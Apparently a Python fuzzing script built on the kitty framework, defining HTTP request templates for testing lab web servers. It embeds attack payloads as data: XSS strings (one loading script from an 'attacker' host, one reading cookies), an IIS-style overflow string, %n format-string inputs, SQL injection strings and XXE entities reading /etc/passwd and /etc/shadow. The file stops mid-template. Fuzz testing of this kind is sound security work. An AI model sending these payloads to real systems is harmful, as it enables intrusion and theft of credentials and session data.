#!/usr/bin/python

import socket
import os
import sys
from kitty.model import Template
from kitty.model import GraphModel
from kitty.fuzzers import ServerFuzzer
from kitty.targets.server import ServerTarget
from kitty.interfaces import WebInterface
from kitty.targets import ServerTarget
from kitty.remote import RpcServer
from kitty.controllers.empty import EmptyController
from kitty.controllers.base import BaseController
from kitty.controllers.client import ClientController
from kitty.model import *
#==================================================================
'''	
Test Cases
Server		Host				Port

apache2:	192.168.146.131		80
caddy: 		192.168.146.131		2015
jexus: 		192.168.146.131		2016
monkey:		192.168.146.131		2017
lighttpd:	192.168.146.131		2018
'''

NAME="target"
HOST="localhost"
PORT=80

URL="http://"+HOST

#==================================================================
# Basic Models


http_get_01 = Template(name='HTTP_GET_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])






http_get_02 = Template(name='HTTP_GET_02', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/doc', name='path1'),     # 2. Path - a string with the value "/index.html"
	String('/index.html', name='page1'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_get_03 = Template(name='HTTP_GET_03', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path1'),     # 2. Path - a string with the value "/index.html"
	String('?', name='path2', fuzzable=False),     # 2. Path - a string with the value "/index.html"
    String('doc', name='path3'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom'),      
])

#----------------------------------------------------------------

http_post_01 = Template(name='HTTP_POST_01', fields=[
    String('POST', name='method'),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1'),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol'),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



#==================================================================
# Path


http_path_01 = Template(name='HTTP_PATH_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      
	String('Host', name='host', fuzzable=False), 
	Delimiter(':', name='colon1', fuzzable=False),
	Delimiter(' ', name='space3'),
	String(URL, name='host1'), 
])



http_path_02 = Template(name='HTTP_PATH_02', fields=[
	String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
	Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
	String('/dir', name='path1'),
	String('/page', name='path2'),
	Delimiter('.', name='path3'),
	String('html', name='path4'),
	Delimiter('?', name='path5'),
	String('name1', name='path6'),
	Delimiter('=', name='path7'),
	String('value1', name='path8'),
	Delimiter('&', name='path9'),
	String('name2', name='path10'),
	Delimiter('=', name='path11'),
	String('value2', name='path12'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
	String('Host', name='host', fuzzable=False), 
	Delimiter(':', name='colon1', fuzzable=False),
	Delimiter(' ', name='space3'),
	String(URL, name='host1'), 
])




#==================================================================
# XSS

http_xss_01 = Template(name='HTTP_XSS_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
	String('\"<div><script>alert(1);</script>', name='xss'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom'),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_xss_02 = Template(name='HTTP_XSS_02', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
	String('\"<div><script>alert(1);</script>', name='xss'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom3'),
	String('Content-type: ', name='ctypeh', fuzzable=False),
	String('text/html', name='ctype'),
	Delimiter('\r\n\r\n', name='eom4'),
])


http_xss_03 = Template(name='HTTP_XSS_03', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html"
	String('<input type="button" onclick="createSearchUrl('')" value="Copy url"/>\n', name='xss1'),
	String('<script>\n', name='xss2'),
	String("registerStatistics('searchTerm', '');\n", name='xss3'),
	String('</script>\n', name='xss4'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host'),
	String(URL, name='url'),
	Delimiter('\r\n\r\n', name='eom3'),
	String('Content-type: ', name='ctypeh'),
	String('text/html', name='ctype'),
	Delimiter('\r\n\r\n', name='eom4'),
])


http_xss_04 = Template(name='HTTP_XSS_04', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
	String('<img src=\"blah.jpg\" onerror=\"alert(\'XSS\')\"/>', name='xss1'),
	String('<script>\n', name='xss2'),
	String("registerStatistics('searchTerm', '');\n", name='xss3'),
	String('</script>\n', name='xss4'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host'),
	String(URL, name='url'),
	Delimiter('\r\n\r\n', name='eom3'),
	String('Content-type: ', name='ctypeh'),
	String('text/html', name='ctype'),
	Delimiter('\r\n\r\n', name='eom4'),
])

http_xss_05 = Template(name='HTTP_XSS_05', fields=[
    String('GET', name='method', fuzzable=False),
    Delimiter(' ', name='space1', fuzzable=False),
    String('/index.html', name='path'),     
	String('?<script>alert(1)</script>', name='xss1'),
	String('<script>\n', name='xss2'),
	String("registerStatistics('searchTerm', '');\n", name='xss3'),
	String('</script>\n', name='xss4'),
    Delimiter(' ', name='space2'),          
    String('HTTP/1.0', name='protocol', fuzzable=False),    
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom3', fuzzable=False),
	String('Content-type: ', name='ctypeh', fuzzable=False),
	String('text/html', name='ctype', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom4'),
])


http_xss_06 = Template(name='HTTP_XSS_06', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/sample.action', name='path'),     # 2. Path - a string with the value "/index.html" 
	String('?', name='xss0_0', fuzzable=False),
	String('var', name='xss0_1'),
	String('=', name='xss0_2', fuzzable=False),
	String('%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='xss1'),
	String('<script>\n', name='xss2'),
	String("registerStatistics('searchTerm', '');\n", name='xss3'),
	String('</script>\n', name='xss4'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url'),
	Delimiter('\r\n\r\n', name='eom3'),
	String('Content-type: ', name='ctypeh'),
	String('text/html', name='ctype'),
	Delimiter('\r\n\r\n', name='eom4'),
])



http_xss_07 = Template(name='HTTP_XSS_07', fields=[
    String('GET', name='method', fuzzable=False),
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
	String('?', name='xss0_0', fuzzable=False),
	String('var', name='xss0_1'),
	String('=', name='xss0_2', fuzzable=False),
	String('<script>\n', name='xss1'),
	String("alert\n", name='xss2'),
	String("(document.cookie);", name='xss3'),
	String('</script>\n', name='xss4'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom3', fuzzable=False),
	String('Content-type: ', name='ctypeh', fuzzable=False),
	String('text/html', name='ctype', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom4'),
])



http_xss_08 = Template(name='HTTP_XSS_07', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
	String('?', name='xss0_0', fuzzable=False),
	String('param', name='xss0_1'),
	String('=', name='xss0_2', fuzzable=False),
	String('<STYLE>\n', name='xss1'),
	String("@import", name='xss2'),
	String("\"javascript:alert('XSS')\"", name='xss3'),
	String(';</STYLE>\n', name='xss4'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom3', fuzzable=False),
	String('Content-type: ', name='ctypeh', fuzzable=False),
	String('text/html', name='ctype', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom4'),
])


http_xss_08 = Template(name='HTTP_XSS_07', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path'),     # 2. Path - a string with the value "/index.html" 
	String('?', name='xss0_0', fuzzable=False),
	String('var', name='xss0_1'),
	String('=', name='xss0_2', fuzzable=False),
	String("<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss.js\">", name='xss2'),
	String('</SCRIPT>', name='xss3'),
    Delimiter(' ', name='space2'),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),   
	String('Host: ', name='host', fuzzable=False),
	String(URL, name='url', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom3', fuzzable=False),
	String('Content-type: ', name='ctypeh', fuzzable=False),
	String('text/html', name='ctype', fuzzable=False),
	Delimiter('\r\n\r\n', name='eom4'),
])

#==================================================================
# Overflow 
http_ovf_01 = Template(name='HTTP_OVF_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?myinput=%fc%80%80%80%80%a2%fc%80%80%80%80%bE%FC%80%80%80%80%BC%FC%80%80%80%81%B7%FC%80%80%80%81%A8%FC%80%80%80%81%B3%FC%80%80%80%81%A3%FC%80%80%80%81%A8%FC%80%80%80%81%A5%FC%80%80%80%81%A3%FC%80%80%80%81%AB%FC%80%80%80%80%BE%fc%80%80%80%80%bCscript%fc%80%80%80%80%bEalert%fc%80%80%80%80%a81%fc%80%80%80%80%a9%fc%80%80%80%80%bC%fc%80%80%80%80%aFscript%fc%80%80%80%80%bE', name='ovf'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.0', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_ovf_02 = Template(name='HTTP_OVF_02', fields=[
	String('GET /default.ida?', name='method file', fuzzable=False), 
	String('NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN', name='ovf'),
	String(' HTTP/1.1\r\n\r\n', name='protocol name', fuzzable=False),
])


#==================================================================
# Format string errors
http_fmt_01 = Template(name='HTTP_FMT_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d%s%p%x%d', name='fmt1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_fmt_02 = Template(name='HTTP_FMT_02', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='fmt0', fuzzable=False),
	String("%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%", name='fmt1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_fmt_03 = Template(name='HTTP_FMT_03', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='fmt0', fuzzable=False),
	String('%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%', name='fmt1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


#========================================================================
# Sql Injection

http_sql_01 = Template(name='HTTP_SQL_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('\'||(elt(-3+5,bin(15),ord(10),hex(char(45))))', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_sql_02 = Template(name='HTTP_SQL_02', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('||6', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_sql_03 = Template(name='HTTP_SQL_03', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('\' OR 1=1-- ', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_sql_04 = Template(name='HTTP_SQL_04', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('%22+or+isnull%281%2F0%29+%2F*', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_sql_05 = Template(name='HTTP_SQL_05', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('%27+OR+%277659%27%3D%277659', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_sql_06 = Template(name='HTTP_SQL_06', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('" or 1=1--', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_sql_07 = Template(name='HTTP_SQL_07', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='sql0', fuzzable=False),
	String('\" or 1=1--', name='sql1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



#========================================================================
# Xml Injection

http_xml_01 = Template(name='HTTP_XML_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<![CDATA[<script>var n=0;while(true){n++;}</script>]]>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_xml_02 = Template(name='HTTP_XML_02', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'gotcha\');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_xml_03 = Template(name='HTTP_XML_03', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[\' or 1=1 or \'\'=\']]></foof>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_xml_04 = Template(name='HTTP_XML_04', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_xml_05 = Template(name='HTTP_XML_05', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


http_xml_06 = Template(name='HTTP_XML_06', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])



http_xml_07 = Template(name='HTTP_XML_07', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xml0', fuzzable=False),
	String('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>', name='xml1'),
    Delimiter(' ', name='space2', fuzzable=False),          # 2.a. The space between Path and Protocol
    String('HTTP/1.1', name='protocol', fuzzable=False),    # 3. Protocol - a string with the value "HTTP/1.1"
    Delimiter('\r\n\r\n', name='eom', fuzzable=False),      # 4. The double "new lines" ("\r\n\r\n") at the end of the http request
])


#========================================================================
# Xpath injection
http_xpath_01 = Template(name='HTTP_Xpath_01', fields=[
    String('GET', name='method', fuzzable=False),           # 1. Method - a string with the value "GET"
    Delimiter(' ', name='space1', fuzzable=False),          # 1.a The space between Method and Path
    String('/index.html', name='path', fuzzable=False),     # 2. Path - a string with the value "/index.html"
	String('?', name='xpath0', fuzzable=False),
	String('\'+or+\'1\'=\'1', name='xpath1'),
